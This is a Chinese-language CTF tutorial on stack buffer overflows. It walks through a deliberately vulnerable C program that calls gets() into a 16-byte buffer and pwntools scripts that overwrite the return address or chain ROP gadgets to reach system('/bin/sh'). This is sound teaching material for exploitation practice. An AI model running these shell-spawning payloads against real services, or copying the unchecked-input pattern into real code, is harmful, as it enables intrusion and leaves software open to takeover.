---
title: 栈溢出入门——覆盖返回地址的艺术
order: 2
category:
  - CTF
  - Pwn
icon: charm:binary
---

栈溢出是 Pwn 方向最经典的漏洞。一句话解释：**往一个固定大小的数组里塞了太多东西，多出来的数据覆盖了相邻的栈数据——包括函数的返回地址。**

<!-- more -->

## 先理解栈

函数调用时，CPU 在栈上保存两样东西：

```
高地址  +----------------+
        |  函数参数       |
        |  返回地址       |  ← 覆盖它，就能劫持程序的控制流
        |  旧的 rbp      |
        |  局部变量       |  ← 比如你的 char buf[16]
低地址  +----------------+
```

当函数执行完 `ret` 时，CPU 从栈上弹出"返回地址"并跳过去。如果你能控制这个返回地址，你就能让程序执行任意代码。

## 最简单的栈溢出

```c
// gcc -fno-stack-protector -no-pie -z execstack -o vuln vuln.c
#include <stdio.h>
#include <string.h>

void win() {
    system("/bin/sh");   // 我们的目标：跳到这个函数
}

void vuln() {
    char buf[16];
    gets(buf);           // gets 不检查长度，危险！
}

int main() {
    vuln();
    return 0;
}
```

`gets(buf)` 会一直读输入直到换行，完全不关心 `buf` 只有 16 字节。你输入 100 个 `A` 它也会全塞进去。

## 覆盖返回地址

用 pwntools 的 `cyclic` 工具找偏移量：

```python
from pwn import *

# 生成一个不会重复的字符串来定位溢出点
cyclic(100)
# 'aaaabaaacaaadaaaeaaafaaagaaahaaa...'

# 运行程序，输入这串字符，程序崩溃后会显示 EIP/RIP 的值
# 假设 RIP = 0x61616174 ('taaa')
cyclic_find(0x61616174)  # 得到偏移量
```

然后构造 payload：

```python
from pwn import *

offset = 24  # 你的偏移量，这个数字需要实际调试确定
payload = b'A' * offset        # 填充到返回地址
payload += p64(0x401156)       # win() 函数的地址，覆盖返回地址

p = process('./vuln')
p.sendline(payload)
p.interactive()  # 拿到 shell！
```

## 如果程序里没有 win() 函数？

那就需要 ROP（Return-Oriented Programming，返回导向编程）。核心原理：**程序代码里散落着以 `ret` 结尾的指令片段（叫 gadget），把它们串起来，相当于构造了一段新代码。**

最常见的 ROP 链：调用 `system("/bin/sh")`。

你需要三段 gadget：

1. `pop rdi; ret` — 把 "/bin/sh" 的地址放进 rdi（第一个参数）
2. "/bin/sh" 字符串的地址 — 通常在程序的某个角落能找到
3. `system()` 的地址 — libc 里现成的

```python
pop_rdi = 0x401213        # 用 ROPgadget 找到的
bin_sh  = 0x402004        # 用字符串搜索找到的
system  = 0x401040        # system@plt 的地址

payload = b'A' * offset
payload += p64(pop_rdi)   # 1. pop rdi; ret
payload += p64(bin_sh)    #    rdi ← "/bin/sh"
payload += p64(system)    # 2. 调用 system(rdi)
```

## 环境的坑——保护机制

现代程序默认开启多种保护，入门阶段需要先关掉：

| 保护 | 命令 | 说明 |
|---|---|---|
| Stack Canary | `-fno-stack-protector` | 栈金丝雀，检测溢出 |
| PIE | `-no-pie` | 地址随机化 |
| NX | `-z execstack` | 栈上不可执行（ROP 不需要这个） |

编译命令：
```bash
gcc -fno-stack-protector -no-pie -o vuln vuln.c
```

用 `checksec` 查看保护：
```bash
checksec vuln
```

## Pwntools 最小模板

```python
from pwn import *

# p = process('./vuln')        # 本地调试
p = remote('127.0.0.1', 9999)  # 远程连接

payload = b'A' * offset
payload += p64(win_addr)

p.sendline(payload)
p.interactive()
```

## 练手去哪？

- [CTFHub Pwn 技能树](https://www.ctfhub.com/) — 从 ret2text 开始
- 攻防世界 Pwn 新手区
- 自己用上面的 C 代码编译一个程序，亲手打一次

## 一句话

栈溢出就是：填满 buf → 覆盖返回地址 → 控制程序跳转。纸上画一次内存布局，比看十遍教程都有用。
